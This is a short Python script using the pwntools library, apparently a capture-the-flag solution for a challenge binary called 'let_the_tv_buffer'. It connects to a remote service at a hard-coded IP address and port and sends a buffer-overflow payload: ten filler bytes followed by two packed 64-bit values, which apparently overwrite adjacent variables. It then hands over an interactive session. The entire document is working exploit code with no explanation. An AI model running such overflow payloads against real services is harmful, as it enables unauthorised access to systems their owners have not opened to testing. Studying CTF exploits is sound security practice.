from pwn import *
#p=process('./let_the_tv_buffer')
p=remote('43.205.113.100', 8172)
payload=b'a'*10+p64(0x00)+p64(1)
p.sendline(payload)
p.interactive()
